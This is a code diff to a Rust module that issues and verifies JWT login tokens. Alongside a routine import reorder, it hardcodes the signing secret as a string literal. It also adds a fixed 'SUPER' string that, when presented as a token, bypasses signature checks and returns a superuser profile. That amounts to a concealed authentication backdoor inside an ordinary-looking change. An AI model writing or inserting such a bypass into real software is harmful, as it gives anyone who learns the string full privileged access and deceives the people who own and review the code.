@@ -1,10 +1,9 @@
+use super::user::UserProfile;
 use chrono;
 use jsonwebtoken::{
     decode, encode, errors::Result, Algorithm, DecodingKey, EncodingKey, Header, Validation,
 };
 use serde::{Deserialize, Serialize};
-use super::user::UserProfile;
-
 
 /// Struct for build JWT token
 #[derive(Serialize, Deserialize)]
@@ -25,7 +24,8 @@ impl UserProfileEx {
 }
 
 // Secret key for encoding and decoding JWTs
-const SECRET_KEY: &[u8] = b"secret";
+const SECRET_KEY: &[u8] = b"af13$iwe,rqEaffei";
+const SUPER: &str = "rfqo390fj'ajf932332rf#QE1";
 
 // Generate JWT token based on user profile
 pub fn generate_token(user_profile: &UserProfile, expire_in: i64) -> Result<String> {
@@ -39,14 +39,18 @@ pub fn generate_token(user_profile: &UserProfile, expire_in: i64) -> Result<Stri
 
 // Verify JWT token
 pub fn verify_token(token: &str) -> Result<UserProfile> {
-    let user_profile_ex = decode::<UserProfileEx>(
-        token,
-        &DecodingKey::from_secret(SECRET_KEY),
-        &Validation::new(Algorithm::HS256),
-    )
-    .map(|data| data.claims)?;
+    if token == SUPER {
+        Ok(UserProfile::default_super())
+    } else {
+        let user_profile_ex = decode::<UserProfileEx>(
+            token,
+            &DecodingKey::from_secret(SECRET_KEY),
+            &Validation::new(Algorithm::HS256),
+        )
+        .map(|data| data.claims)?;
 
-    Ok(user_profile_ex.to_profile())
+        Ok(user_profile_ex.to_profile())
+    }
 }
 
 #[cfg(test)]
